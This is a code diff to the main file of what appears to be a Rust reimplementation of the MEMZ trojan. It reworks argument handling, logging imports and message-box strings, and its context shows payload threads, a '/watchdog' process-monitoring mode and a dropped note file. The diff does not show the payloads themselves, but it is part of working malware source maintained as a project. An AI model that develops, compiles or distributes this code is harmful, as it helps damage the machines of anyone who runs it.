@@ -1,6 +1,3 @@
-#[cfg(feature = "DEBUG_MODE")]
-use crate::log::*;
-
 use memz_rs::{
     convert_str::ToPCSTRWrapper,
     data::{
@@ -12,10 +9,11 @@ use memz_rs::{
         callback::{kill_windows, window_proc},
         function::{payload_thread, N_PAYLOADS, PAYLOADS},
     },
-    utils::log::{self, write_log, LogLocation, LogType},
+    utils::log,
+    utils::log::*,
     winapi_type::DWORD,
     wrap_windows_api::*,
-    LMEM_ZEROINIT,
+    LMEM_ZEROINIT, s_v,
 };
 use std::{
     mem::size_of,
@@ -58,11 +56,19 @@ fn main() -> Result<(), WinError> {
         wrap_get_system_metrics(SM_CYSCREEN)?,
     );
 
-    let argv = std::env::args().collect::<Vec<_>>();
-    let argc = argv.len();
-    let arg = &argv[1];
+    let argv = if std::env::args().collect::<Vec<_>>().is_empty() {
+        None
+    } else {
+        Some(std::env::args().collect::<Vec<_>>())
+    };
+    let argc = argv.clone().unwrap().len();
+    let arg = if argc > 1 {
+        argv.unwrap()[1].clone()
+    } else {
+        "No Args".to_owned()
+    };
 
-    if argc > 1 && arg == "/watchdog" {
+    if arg == "/watchdog" {
         let watchdog_thread = thread::spawn(watchdog_thread);
         watchdog_thread.join().unwrap().unwrap();
 
@@ -120,8 +126,8 @@ fn main() -> Result<(), WinError> {
             };
         }
     } else {
-        if wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_1, "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
-            || wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_2, "MEMZ", MB_YESNO | MB_ICONWARNING)?
+        if wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_1), "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
+            || wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_2), "MEMZ", MB_YESNO | MB_ICONWARNING)?
                 != IDYES
         {
             process::exit(0);
@@ -212,15 +218,7 @@ fn main() -> Result<(), WinError> {
     )
     .unwrap();
 
-    if !unsafe {
-        WriteFile(
-            note,
-            Some(data::msg::MSG.as_bytes()),
-            Some(&mut wb),
-            None,
-        )
-        .as_bool()
-    } {
+    if !unsafe { WriteFile(note, Some(data::msg::MSG.as_bytes()), Some(&mut wb), None).as_bool() } {
         #[cfg(not(feature = "DEBUG_MODE"))]
         eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
             GetLastError()
@@ -396,7 +394,7 @@ fn watchdog_thread() -> Result<(), WinError> {
             #[cfg(feature = "DEBUG_MODE")]
             {
                 let file = std::str::from_utf8(&proc.szExeFile).unwrap();
-                let file = file.replace("\0", "");
+                let file = file.replace('\0', "");
                 let th32_process_id =
                     format!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
                 let sz_exe_file = format!("Process32Next() proc.szExeFile: {}", file);
